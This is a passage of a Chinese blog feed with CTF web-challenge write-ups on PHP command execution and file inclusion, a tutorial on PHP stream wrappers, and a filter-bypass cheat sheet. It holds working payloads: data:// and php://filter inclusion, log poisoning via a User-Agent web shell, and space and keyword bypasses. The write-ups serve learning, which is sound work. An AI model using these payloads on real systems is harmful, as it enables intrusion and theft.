class="hljs-regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=<br></code></pre></td></tr></table></figure><p>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;  —&gt;   <strong>&lt;?php system(‘cat flag.php’);</strong></p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>关键源码：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个题php和data协议都用不了了，尝试以下包含日志文件<br>通过fn+f12查看网络<br><img src="/images/13.png"><br>或<br>burpsuite抓包<br>或<br>Wappalyzer<br>都可看到<br>本题是nginx服务器</p><p>nginx服务器的日志通常路径为：<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>或<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>本题的路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>在url中输入?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 读取日志<br>发现内容为请求行、UA头、IP地址</p><p>使用burp suite抓包<br>在UA头写入shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>启动中国蚁剑拿到flag</p><p>方法二：</p><p>burp suite抓包<br>在UA头中插入payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl??.php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>获得flag</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>与80题方法一样😊</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议🥰</title>
    <link href="/2023/04/20/phpweixieyi/"/>
    <url>/2023/04/20/phpweixieyi/</url>
    
    <content type="html"><![CDATA[<p>php伪协议是ctf中的一个考点，目前比较熟悉的伪协议有php:&#x2F;&#x2F;filter,php:&#x2F;&#x2F;input,data:&#x2F;&#x2F;text&#x2F;plain,file:&#x2F;&#x2F;。<br>要成功应用伪协议需要php.ini文件的<strong>allow_url_fopen 默认开启</strong>       <strong>allow_url_include 默认关闭</strong></p><h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h2><p>此协议可以在双off的情况下使用，用于访问本地文件<br>使用方法：<br>file:&#x2F;&#x2F;文件绝对路径和文件名 如<a href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a></p><h2 id="data-x2F-x2F-text-x2F-plain协议"><a href="#data-x2F-x2F-text-x2F-plain协议" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain协议"></a>data:&#x2F;&#x2F;text&#x2F;plain协议</h2><p>此协议需要在双on的情况下才能使用，很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入<br>使用方法：<br>data:&#x2F;&#x2F;text&#x2F;plain;base64,base64编码字符  如<a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p><p>　　　　　data:&#x2F;&#x2F;text&#x2F;plain,字符   如<a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><h2 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php:input协议"></a>php:input协议</h2><p>此协议需要allow_url_include为on，可以访问请求的原始数据的只读流，将post请求的数据作为php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<br>使用方法：php:&#x2F;&#x2F;input,然后post需要执行的数据 如<a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a>    然后在post中<?php phpinfo() ?><br><img src="/images/hhh.png"></p><h2 id="php-x2F-x2F-filter协议"><a href="#php-x2F-x2F-filter协议" class="headerlink" title="php:&#x2F;&#x2F;filter协议"></a>php:&#x2F;&#x2F;filter协议</h2><p>在双off的情况下也可使用，读取文件并进行显示或写入</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的，它指定了你要筛选过滤的数据流。</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符(</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>write&#x3D;&lt;写链的筛选列表&gt;</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>使用方法：<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;文件名(对文件进行base64编码并读取显示)  如：<br><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门:命令执行🫠</title>
    <link href="/2023/04/19/minlinzhixin/"/>
    <url>/2023/04/19/minlinzhixin/</url>
    
    <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br>  <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><br></code></pre></td></tr></table></figure><p>preg_match函数是进行<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168190228216800192231163%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168190228216800192231163&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev85%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式</a>的匹配，成功返回1，否则返回0。<br>在这个正则里边有一个参数是i，这个在正则表达式里边是不区分大小写的一个参数</p><p>查看目录</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>获取flag.php ，关键字flag过滤，使用通配符？</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>ctrl+u查看源码</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>cp命令将flag.php保存到1.txt 再去访问1.txt</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>接着在url后输入1.txt就可以看到flag了</p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>存源代码中我们可以看出这次过滤了flag，system，php<br>所以这里我们可以用’’来代替system()，这里的&#96;是tab上面的反斜号</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=`cp fla?.p?? <span class="hljs-number">1</span>.txt`;<br></code></pre></td></tr></table></figure><p>在url后输入1.txt查看获得flag</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>从源代码可以看出，这题还过滤了cat和空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以用eval( )来操作， 这个1已经不属于c的内容了，所以不受过滤管控了，</p><p>得到空白页面右击看源码才能得到flag</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p> 将cat 换成 tac 就可以直接看到flag,(tac 是 cat 的反向显示),cat也可以直接看到</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据源代码可知，反引号，分号，括号都不能用<br>没有括号就不能使用上一题的eval(),所以要用没有括号的函数，比如include<br>分号可以用？&gt;代替<br>还需要配合使用<strong>伪协议</strong>，通过特定的通道读取文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>这里我们获得了一个base64的数据<img src="/images/666.png" alt="base64"></p><p><a href="https://c.runoob.com/front-end/693/">base64解码</a></p><p>获得flag！</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多过滤了一个”<br>使用上一题的方法一样可以做出来</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>同样的base64加密，解码获得flag</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多过滤了一个冒号，也不影响我们使用上面的方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>代码懒得帖了<br>ps:此处多过滤了&lt;&#x3D;，与上题题解一样</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>代码懒得贴了，和前几题类似<br>ps:此处过滤了数字</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过data:&#x2F;&#x2F;text&#x2F;plain协议来进行漏洞利用</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>ctrl+u以获得flag!</p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>比上一题多过滤了php，file<br>使用上一题的方法就行，需要把php换成&#x3D; 即<?=内容?></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span> system(<span class="hljs-string">&quot;cat fla?.ph?&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>加了个后缀.php，但还是不影响用data协议</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/?c=data://text/plains,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>只是后面多了个.php<br><img src="/images/678.png"></p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>在url中输入</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/?c=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));<br></code></pre></td></tr></table></figure><p>得到flag<br>emmm~并不知道这是什么原理，后续跟进🥹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行绕过小技巧</title>
    <link href="/2023/04/19/minlinzhixinraoguo/"/>
    <url>/2023/04/19/minlinzhixinraoguo/</url>
    
    <content type="html"><![CDATA[<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h4 id="windows-下："><a href="#windows-下：" class="headerlink" title="windows 下："></a>windows 下：</h4><blockquote><ul><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h4 id="Linux-下："><a href="#Linux-下：" class="headerlink" title="Linux 下："></a>Linux 下：</h4><blockquote><ul><li><strong>;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ul><li><strong>&gt;</strong> &lt; &lt;&gt; 重定向符</li><li>%09(需要php环境)</li><li>${IFS}</li><li>$IFS$9</li><li>{cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能</li><li>%20</li><li>%09</li></ul><h2 id="命令执行函数"><a 